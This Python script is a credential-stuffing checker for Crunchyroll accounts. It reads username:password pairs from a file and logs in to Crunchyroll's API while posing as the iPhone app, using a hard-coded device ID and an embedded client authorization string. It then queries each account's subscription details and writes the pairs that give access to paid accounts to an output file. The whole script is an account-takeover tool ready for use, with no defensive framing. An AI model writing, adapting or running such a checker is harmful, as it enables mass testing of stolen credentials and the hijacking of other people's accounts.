# -*- coding: utf-8 -*-
import requests

def check_crunchyroll_account(username, password):
    device_id = "09313DAA-FD60-476F-BE6C-DCE586A53BB4"
    headers = {
        "Host": "beta-api.crunchyroll.com",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "ETP-Anonymous-ID": device_id,
        "User-Agent": "Crunchyroll/4.48.1 (bundle_identifier:com.crunchyroll.iphone; build_number:3578348.327156123) iOS/17.4.1 Gravity/4.48.1",
        "Accept-Language": "en-EG;q=1.0, ar-EG;q=0.9",
        "Authorization": "Basic YXJ1ZDEtbnJhdGcxYW94NmRsaGU6TlRDMXFpdGczQ3p1TWVkTnlZZ3BGblk0NzdVTGxacnk=",
        "Accept-Encoding": "gzip;q=1.0, compress;q=0.5"
    }

    data = {
        "device_id": device_id,
        "device_name": "iPhone",
        "device_type": "iPhone 14 Pro",
        "grant_type": "password",
        "password": password,
        "scope": "offline_access",
        "username": username
    }

    try:
        response = requests.post("https://beta-api.crunchyroll.com/auth/v1/token", headers=headers, data=data)
        response.raise_for_status()
    except requests.RequestException as e:
        return {"status": "failure", "message": f"Network error: {e}"}
    
    result = response.json()

    if "access_token" not in result:
        return {"status": "failure", "message": "Failed to obtain access token."}
    
    access_token = result["access_token"]
    headers["authorization"] = f"Bearer {access_token}"

    try:
        account_info_response = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers)
        account_info_response.raise_for_status()
    except requests.RequestException as e:
        return {"status": "failure", "message": f"Network error: {e}"}

    account_info = account_info_response.json()

    account_id = account_info.get("external_id", "")
    subscription_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{account_id}/benefits"

    try:
        subscription_response = requests.get(subscription_url, headers=headers)
        subscription_response.raise_for_status()
    except requests.RequestException as e:
        return {"status": "failure", "message": f"Network error: {e}"}

    subscription_info = subscription_response.json()

    if "subscription_country" not in subscription_info:
        return {"status": "free", "message": "Free account or no subscription found."}
    
    country_code = subscription_info["subscription_country"]
    country_dict = {
        "US": "United States 🇺🇸",
        "CA": "Canada 🇨🇦",
        "GB": "United Kingdom 🇬🇧",
        "AU": "Australia 🇦🇺",
        "DE": "Germany 🇩🇪",
        "FR": "France 🇫🇷",
        "IT": "Italy 🇮🇹",
        "ES": "Spain 🇪🇸",
        "BR": "Brazil 🇧🇷",
        "MX": "Mexico 🇲🇽",
        "JP": "Japan 🇯🇵",
        "KR": "South Korea 🇰🇷",
        "CN": "China 🇨🇳",
        "IN": "India 🇮🇳",
        "RU": "Russia 🇷🇺",
        "ZA": "South Africa 🇿🇦",
        "NG": "Nigeria 🇳🇬",
        "EG": "Egypt 🇪🇬",
        "AR": "Argentina 🇦🇷",
        "CL": "Chile 🇨🇱",
        "CO": "Colombia 🇨🇴",
        "PE": "Peru 🇵🇪",
        "NZ": "New Zealand 🇳🇿",
        "SG": "Singapore 🇸🇬",
        "TH": "Thailand 🇹🇭",
        "MY": "Malaysia 🇲🇾",
        "PH": "Philippines 🇵🇭",
        "ID": "Indonesia 🇮🇩"
    }

    country_name = country_dict.get(country_code, "Unknown Country")

    return {
        "status": "success",
        "account_id": account_id,
        "subscription_country": country_name,
        "subscription_info": subscription_info
    }

def process_accounts(file_path, output_path):
    print(f"Processing file: {file_path}")
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            accounts = file.readlines()
        
        with open(output_path, 'w', encoding='utf-8') as file:
            for line in accounts:
                username, password = line.strip().split(':')
                print(f"Checking account: {username}")
                result = check_crunchyroll_account(username, password)
                
                if result["status"] == "success":
                    print(f"Valid account found: {username}")
                    file.write(f"{username}:{password}\n")
                else:
                    print(f"Account {username}: Status: {result['status']}, Message: {result['message']}")
            
            print(f"Valid accounts saved to {output_path}")

    except FileNotFoundError:
        print("File not found. Please check the file path.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    input_path = input("Enter the path to the accounts file (e.g., /storage/emulated/0/Download/crunchyroll.txt): ")
    output_path = input("Enter the path to save valid accounts (e.g., /storage/emulated/0/Download/valid_accounts.txt): ")
    process_accounts(input_path, output_path)
    
